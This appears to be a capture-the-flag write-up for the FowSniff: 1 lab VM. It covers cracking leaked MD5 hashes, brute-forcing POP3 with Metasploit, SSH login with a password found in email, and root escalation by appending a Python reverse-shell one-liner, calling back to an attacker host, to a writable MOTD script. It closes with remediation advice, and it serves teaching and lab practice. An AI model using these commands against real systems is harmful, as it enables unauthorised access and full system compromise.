# FowSniff: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.29 |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/) |

## Attack Summary

FowSniff: 1 is a beginner-friendly OSINT-to-shell machine. A Google search for "fowsniff corp" reveals a Pastebin post with leaked MD5 hashes for company employees. After cracking eight of the nine hashes, the credentials are used to brute-force POP3. One of the recovered email messages discloses an SSH password. SSH access is obtained as user `baksteen`. Privilege escalation exploits a writable script (`/opt/cube/cube.sh`) that is executed as root by the MOTD subsystem on every SSH login.

## Methodology

1. Network enumeration
2. OSINT — leaked credentials on Pastebin
3. Offline/online MD5 hash cracking
4. POP3 brute-force with Metasploit
5. Email message inspection for SSH credentials
6. SSH access
7. Group-based file permission abuse (MOTD script)
8. Reverse shell escalation to root

---

## Step 1: Reconnaissance

```bash
netdiscover
nmap -A -p- -T4 $TARGET
```

![nmap](images/01-nmap.png)

**Open ports:**
- 22/tcp — SSH
- 80/tcp — HTTP (company page, no useful content)
- 110/tcp — POP3
- 143/tcp — IMAP

`dirb` and `nikto` against port 80 return nothing actionable.

---

## Step 2: OSINT — Leaked Credential Dump

Search Google for `"fowsniff"` or `"fowsniff corp"`. A Pastebin post surfaces with a list of company email addresses and MD5 password hashes.

Crack the hashes using an online service (e.g., crackstation.net) or Hashcat:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Eight of nine hashes crack successfully. Build credential lists:

```bash
# user.txt — extracted email usernames
# pass.txt — cracked plaintext passwords
```

---

## Step 3: POP3 Brute-Force

```bash
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS $TARGET
set USER_FILE user.txt
set PASS_FILE pass.txt
set VERBOSE false
run
```

![pop3-brute](images/02-pop3-brute.png)

**Credentials found:** `seina` / `scoobydoo2`

---

## Step 4: Read Emails via POP3

Connect manually to read the mailbox:

```bash
nc $TARGET 110
user seina
pass scoobydoo2
list
retr 1
retr 2
```

![pop3-mail](images/03-pop3-mail.png)

- **Message 1** contains the SSH password (temporary password set by an admin).
- **Message 2** hints that the correct SSH username is `baksteen`.

---

## Step 5: SSH Access

```bash
ssh baksteen@$TARGET
# Password: (from email Message 1)
```

![ssh-login](images/04-ssh-login.png)

---

## Step 6: Privilege Escalation — MOTD Script Injection

Enumerate files writable by the `users` group (baksteen's secondary group):

```bash
find / -group users -type f 2>/dev/null
```

`/opt/cube/cube.sh` is owned by the `users` group and is writable. Confirm how it is triggered:

```bash
cat /etc/update-motd.d/00-header
# Shows: /opt/cube/cube.sh
```

The MOTD script calls `cube.sh` as **root** on every SSH login. Append a Python3 reverse shell:

```bash
# On attacker — start listener
nc -lvnp 1234
```

```bash
# On target — append to cube.sh
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" >> /opt/cube/cube.sh
```

Trigger the MOTD by opening a new SSH session:

```bash
ssh baksteen@$TARGET
```

The listener catches a root shell.

```bash
id
cd /root
cat flag.txt
```

![root-flag](images/05-root-flag.png)

---

## Lessons Learned

1. Leaked credential databases (Pastebin, GitHub, paste sites) are a primary real-world attack vector — monitor for credential exposure continuously.
2. MD5 is cryptographically broken for password storage; use bcrypt, scrypt, or Argon2.
3. Email servers that expose internal communications over unauthenticated protocols (no TLS/STARTTLS, no IP filtering) create significant risk.
4. Scripts executed as root during login (MOTD, PAM hooks) must be owned by root and not writable by regular users.

## Remediation

| Vulnerability | Fix |
|---|---|
| Leaked MD5 Hashes | Switch to bcrypt/Argon2; rotate all passwords; enable breach monitoring |
| POP3 Without TLS | Enforce STARTTLS or POP3S (port 995); disable plaintext fallback |
| SSH Password Sharing via Email | Use SSH key pairs; never transmit credentials in cleartext |
| Writable MOTD Script Executed as Root | Set `/opt/cube/cube.sh` owner to `root:root`, mode `0755`; audit all MOTD hooks |
